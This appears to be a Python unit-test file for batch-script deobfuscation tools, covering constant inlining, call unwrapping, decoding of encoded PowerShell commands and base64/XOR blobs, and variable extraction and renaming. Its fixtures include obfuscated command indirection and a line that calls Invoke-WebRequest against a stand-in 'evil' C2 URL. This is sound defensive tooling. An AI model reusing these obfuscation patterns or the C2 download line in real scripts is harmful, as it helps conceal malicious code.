"""inline_constants, unwrap_call, annotate_exec, decode_blobs, extract_variables,
rename_variables.
"""
import base64
import json
import tempfile
import unittest
from pathlib import Path

from tests._harness import call_fn, run_cli, assert_idempotent


def _fn(mod, name):
    return lambda s, **k: call_fn(mod, name, s, **k)


class TestInlineConstants(unittest.TestCase):
    f = staticmethod(_fn('bat_inline_constants', 'inline_constants'))

    def test_single_assignment_inlined_and_removed(self):
        out, stats = self.f('set "path=calc.exe"\r\nstart %path%\r\necho %path%\r\n', max_uses=0)
        self.assertEqual(stats['changed'], 2)
        self.assertEqual(stats['assignments_removed'], 1)
        self.assertIn('start calc.exe', out)
        self.assertNotIn('set "path=', out)

    def test_reassigned_var_not_inlined(self):
        src = 'set "X=1"\r\necho %X%\r\nset "X=2"\r\necho %X%\r\n'
        out, stats = self.f(src, max_uses=0)
        self.assertEqual(stats['changed'], 0)   # >1 assignment -> propagate's job

    def test_max_uses_cap_keeps_assignment(self):
        out, stats = self.f('set "A=x"\r\necho %A%\r\necho %A%\r\necho %A%\r\n', max_uses=1)
        self.assertEqual(stats.get('assignments_removed', 0), 0)

    def test_idempotent(self):
        assert_idempotent(self, self.f, 'set "Q=z"\r\necho %Q%\r\n', max_uses=0)


class TestUnwrapCall(unittest.TestCase):
    f = staticmethod(_fn('bat_unwrap_call', 'unwrap_call'))

    def test_program_hidden_behind_var(self):
        out, stats = self.f('set "X=powershell -c calc"\r\n%X%\r\n')
        self.assertEqual(stats['changed'], 1)
        self.assertIn('powershell -c calc', out.splitlines()[-1] if out.strip() else out)

    def test_chained_indirection(self):
        src = 'set "CMD2=powershell -c calc"\r\nset "CMD1=%%CMD2%%"\r\n%CMD1%\r\n'
        out, stats = self.f(src)
        self.assertEqual(stats['changed'], 1)
        self.assertIn('powershell -c calc', out)

    def test_idempotent(self):
        assert_idempotent(self, self.f, 'set "X=cmd /c dir"\r\n%X%\r\n')


class TestAnnotateExec(unittest.TestCase):
    f = staticmethod(_fn('bat_annotate_exec', 'annotate_exec'))

    def test_encoded_command_decoded(self):
        # base64(UTF-16LE) of "Write-Host hi"
        enc = base64.b64encode('Write-Host hi'.encode('utf-16-le')).decode()
        out, stats = self.f(f'powershell -EncodedCommand {enc}\r\n')
        self.assertEqual(stats['changed'], 1)
        self.assertIn('rem > Write-Host hi', out)
        self.assertIn('<<<EXEC PAYLOAD BEGIN>>>', out)

    def test_non_destructive(self):
        src = 'powershell -Command "calc"\r\n'
        out, _ = self.f(src)
        self.assertIn('powershell -Command "calc"', out)   # original line intact

    def test_idempotent(self):
        assert_idempotent(self, self.f, 'cmd /c "echo hi"\r\n')


class TestDecodeBlobs(unittest.TestCase):
    f = staticmethod(_fn('bat_decode_blobs', 'decode_blobs'))

    def test_base64_var_annotated(self):
        blob = base64.b64encode(b'Hello World! this is the payload').decode()
        out, stats = self.f(f'set "BLOB={blob}"\r\n')
        self.assertEqual(stats['changed'], 1)
        self.assertIn('Hello World!', out)
        self.assertTrue(any(c['variable'] == 'BLOB' for c in stats['candidates']))

    def test_xor_hex_mode_cli(self):
        raw = bytes(b ^ 0x2A for b in b'secret-command-here')
        hexstr = raw.hex()
        out, stats = run_cli('bat_decode_blobs.py', f'set "H={hexstr}"\r\n',
                             '--mode', 'xor-hex', '--key', '42')
        self.assertIn('secret-command-here', out)

    def test_idempotent(self):
        blob = base64.b64encode(b'x' * 40).decode()
        assert_idempotent(self, self.f, f'set "B={blob}"\r\n')


class TestExtractVariables(unittest.TestCase):
    def test_json_report_to_stdout_no_output_file(self):
        src = ('set "URL=http://evil.example/c2"\r\n'
               'set "CMD=powershell -c calc"\r\n'
               'call %CMD%\r\n')
        with tempfile.TemporaryDirectory() as d:
            inp = Path(d) / 'in.cmd'
            inp.write_text(src, encoding='utf-8', newline='')
            import subprocess, sys
            r = subprocess.run([sys.executable, 'bat_extract_variables.py', '--input', str(inp)],
                               capture_output=True, text=True, check=True, cwd=str(Path.cwd()))
            report = json.loads(r.stdout)
        names = {v['name'] for v in report['variables']}
        self.assertIn('URL', names)
        self.assertIn('CMD', names)
        cmd = next(v for v in report['variables'] if v['name'] == 'CMD')
        self.assertTrue(cmd['reaches_sink'])


class TestRenameVariables(unittest.TestCase):
    def test_rename_map_applied_everywhere(self):
        src = 'set "aB3xk=http://evil/c2"\r\nInvoke-WebRequest %aB3xk%\r\n'
        with tempfile.TemporaryDirectory() as d:
            rmap = Path(d) / 'r.json'
            rmap.write_text('{"ab3xk": "c2Url"}', encoding='utf-8')
            out, stats = run_cli('bat_rename_variables.py', src, '--renames', str(rmap))
        self.assertIn('set "c2Url=http://evil/c2"', out)
        self.assertIn('%c2Url%', out)
        self.assertNotIn('aB3xk', out)


if __name__ == '__main__':
    unittest.main()
